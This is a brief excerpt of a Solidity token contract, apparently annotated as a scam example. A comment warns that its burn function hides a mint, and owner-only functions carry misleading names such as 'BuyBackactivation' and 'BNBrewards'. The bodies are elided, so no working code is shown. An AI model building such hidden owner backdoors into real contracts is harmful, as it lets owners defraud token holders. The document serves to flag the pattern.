...
//Token: 0x759c346537eca6bD3a6d9d72b7984a1255bAc706
//Contains a hidden mint (Look at function  burn(address account, uint256 amount))
...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    function BuyBackactivation(bool _balances1_) public onlyOwner {
    ...
    function BNBrewards(address account) public onlyOwner {
